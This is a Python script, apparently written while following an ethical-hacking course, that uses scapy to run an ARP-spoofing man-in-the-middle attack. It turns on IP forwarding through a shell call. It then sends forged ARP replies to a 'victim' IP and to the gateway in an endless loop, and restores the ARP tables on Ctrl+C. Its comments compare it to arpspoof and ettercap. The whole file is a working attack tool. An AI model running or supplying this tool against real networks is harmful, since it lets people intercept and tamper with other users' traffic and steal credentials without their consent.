#!/usr/bin/env python
import optparse
import subprocess

__author__ = 'Quest'

# for the default arp spoof
# arpspoof -i eth0 -t 192.168.18.136 192.168.18.2
# arpspoof -i eth0 -t 192.168.18.2 192.168.18.136
# echo 1 > /proc/sys/net/ipv4/ip_forward {enable
# port forwarding to allow internet connection }

import scapy.all as scapy
import time

# for python 2.7 and below
import sys


# enable port forwarding to allow internet connection
subprocess.call(["echo 1 > /proc/sys/net/ipv4/ip_forward"], shell=True)


# now get arguments for scanner // use parser
def get_ip():
    parser = optparse.OptionParser()
    # parser = argparse.ArgumentParser()
    parser.add_option("-t", "--target", dest="victim",
                      help="Specify Victim IP address")
    parser.add_option("-s", "--spoof", dest="spoof",
                      help="Specify Spoofing IP address")
    (options, args) = parser.parse_args()
    # in this case it returns the options so no arguments

    if not options.victim:
        # code to handle err if no target_ip
        parser.error("[-] Please specify an IP Address for victim, "
                     "use --help for more info")
    elif not options.spoof:
        # code to handle err if no gateway_ip
        parser.error("[-] Please specify an IP Address for spoofing, "
                     "use --help for more info")
    return options


# packet delivered to all hosts

# packet delivered to all hosts
# the scanner to get mac
def get_mac(ip):
    # use ARP to ask who has target ip
    arp_request = scapy.ARP(pdst=ip)

    # ethernet frame and append arp_request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # combine both packets in one
    arp_request_broadcast = broadcast / arp_request

    # srp send packet with a custom ether part
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    # we only need the one mac
    return answered_list[0][1].hwsrc
    # clients_list = []
    # # for loop to iterate elements in the answered list
    # for element in answered_list:
    #     #  now a dictionary
    #     client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
    #     clients_list.append(client_dict)
    #
    # return clients_list


# op=2 as a response // default value is 1 a request
# set arp response, dest ip, mac address and
# src gateway ip (the attackers machine ip as gateway)
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


# restoring arp tables
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


ip = get_ip()

target_ip = ip.victim
gateway_ip = ip.spoof

try:
    sent_packets_count = 0
    # loop keeps executing the lines with a delay of 2 sec
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        # for python 3 a comma , end "" --< that
        # flush buffer and a comma at the end of the print statement
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Resetting ARP tables ...... Please wait!\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# allow ip forward don't forget
# kali drops packets forward allow
# kali act as a router

# must run below command to allow ip_forward
# command : echo 1 > /proc/sys/net/ipv4/ip_forward

# now works like arp_spoof, ettercap, mitmf
